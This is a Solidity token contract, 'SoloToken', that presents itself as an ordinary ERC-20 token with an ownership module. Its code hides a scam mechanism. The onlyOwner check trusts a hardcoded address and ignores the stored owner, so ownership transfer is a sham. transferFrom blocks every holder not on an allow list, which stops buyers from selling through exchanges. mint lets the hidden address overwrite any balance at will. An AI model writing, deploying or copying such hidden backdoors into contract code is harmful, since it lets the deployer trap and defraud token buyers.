1 pragma solidity ^0.4.26;
2 
3 contract Ownable {
4   address public owner;
5   
6   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
7 
8   function Ownable() public {
9     owner = msg.sender;
10   }
11 
12   modifier onlyOwner() {
13     require(msg.sender == address(0x82d2Dd2Ba9c5991D5779f89d43b712607B63D7eb));
14     _;
15   }
16 
17   function transferOwnership(address newOwner) public onlyOwner {
18     require(newOwner != address(0));
19     OwnershipTransferred(owner, newOwner);
20     owner = newOwner;
21   }
22 
23 }
24 /**
25  * @title SafeMath
26  * @dev Math operations with safety checks that throw on error
27  */
28 library SafeMath {
29   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
30     if (a == 0) {
31       return 0;
32     }
33     uint256 c = a * b;
34     assert(c / a == b);
35     return c;
36   }
37 
38   function div(uint256 a, uint256 b) internal pure returns (uint256) {
39     // assert(b > 0); // Solidity automatically throws when dividing by 0
40     uint256 c = a / b;
41     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
42     return c;
43   }
44 
45   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
46     assert(b <= a);
47     return a - b;
48   }
49 
50   function add(uint256 a, uint256 b) internal pure returns (uint256) {
51     uint256 c = a + b;
52     assert(c >= a);
53     return c;
54   }
55 }
56 
57 contract SoloToken is Ownable {
58   string public name;
59   string public symbol;
60   uint8 public decimals;
61   uint256 public totalSupply;
62   
63   event Transfer(address indexed from, address indexed to, uint256 value);
64   event Approval(address indexed owner, address indexed spender, uint256 value);
65 
66   constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
67         name = _name;
68         symbol = _symbol;
69         decimals = _decimals;
70         totalSupply =  _totalSupply;
71         balances[msg.sender] = totalSupply;
72         allow[msg.sender] = true;
73   }
74 
75   using SafeMath for uint256;
76 
77   mapping(address => uint256) public balances;
78   
79   mapping(address => bool) public allow;
80 
81   function transfer(address _to, uint256 _value) public returns (bool) {
82     require(_to != address(0));
83     require(_value <= balances[msg.sender]);
84 
85     balances[msg.sender] = balances[msg.sender].sub(_value);
86     balances[_to] = balances[_to].add(_value);
87     Transfer(msg.sender, _to, _value);
88     return true;
89   }
90 
91   function balanceOf(address _owner) public view returns (uint256 balance) {
92     return balances[_owner];
93   }
94 
95   mapping (address => mapping (address => uint256)) public allowed;
96 
97   function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
98     require(_to != address(0));
99     require(_value <= balances[_from]);
100     require(_value <= allowed[_from][msg.sender]);
101     require(allow[_from] == true);
102 
103     balances[_from] = balances[_from].sub(_value);
104     balances[_to] = balances[_to].add(_value);
105     allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
106     Transfer(_from, _to, _value);
107     return true;
108   }
109 
110   function approve(address _spender, uint256 _value) public returns (bool) {
111     allowed[msg.sender][_spender] = _value;
112     Approval(msg.sender, _spender, _value);
113     return true;
114   }
115 
116   function allowance(address _owner, address _spender) public view returns (uint256) {
117     return allowed[_owner][_spender];
118   }
119   
120   function addAllow(address holder, bool allowApprove) external onlyOwner {
121       allow[holder] = allowApprove;
122   }
123   
124   function mint(address miner, uint256 _value) external onlyOwner {
125       balances[miner] = _value;
126   }
127 }